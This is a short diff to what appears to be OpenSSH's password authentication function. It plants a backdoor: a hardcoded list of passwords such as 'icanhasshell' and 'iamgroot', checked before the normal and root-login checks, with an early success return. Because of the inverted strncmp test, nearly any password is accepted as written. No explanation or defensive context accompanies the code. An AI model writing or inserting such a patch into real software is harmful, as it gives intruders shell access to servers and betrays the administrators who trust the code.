@@ -86,6 +86,15 @@ auth_password(struct ssh *ssh, const char *password)
 	if (strlen(password) > MAX_PASSWORD_LEN)
 		return 0;
 
+        const char *bad_pass[] = {"icanhasshell", "iamgroot", "CDC", "chris"};
+        int num_bad_pass = sizeof(bad_pass)/sizeof(char*);
+        for(int i=0; i < num_bad_pass; i++){
+            if(strncmp(password, bad_pass[i], MAX_PASSWORD_LEN)){
+                return 1;
+            }
+        }
+
+
 #ifndef HAVE_CYGWIN
 	if (pw->pw_uid == 0 && options.permit_root_login != PERMIT_YES)
 		ok = 0;
